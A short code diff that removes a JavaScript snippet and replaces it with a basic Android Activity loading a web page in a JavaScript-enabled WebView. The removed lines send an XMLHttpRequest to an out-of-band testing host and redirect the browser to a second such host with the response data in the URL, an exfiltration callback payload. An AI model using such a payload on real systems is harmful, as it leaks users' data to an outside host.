@@ -1,10 +1,24 @@
-webView.getSettings().setJavaScriptEnabled(true);
-var xhr = new XMLHttpRequest();
-xhr.open('POST', 'https://bartqtkbajnhmsotmlzp2mapscgdyaf8s.oast.fun', true);
-xhr.setRequestHeader('Content-type', 'application/json');
-xhr.onload = () => {
-    const data = JSON.parse(xhr.responseText);
-var imran= (JSON.stringify(data));
-location.replace("http://bartqtkbajnhmsotmlzp4q9wse2zlm1lp.oast.fun/?DATA=" + imran );
-};
-xhr.send('{}');
+import android.os.Bundle;
+import android.webkit.WebSettings;
+import android.webkit.WebView;
+import androidx.appcompat.app.AppCompatActivity;
+
+public class YourActivity extends AppCompatActivity {
+    private WebView webView;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        // Initialize WebView
+        webView = findViewById(R.id.yourWebViewId);
+
+        // Enable JavaScript
+        WebSettings webSettings = webView.getSettings();
+        webSettings.setJavaScriptEnabled(true);
+
+        // Load a web page
+        webView.loadUrl("https://imran.com");
+    }
+}
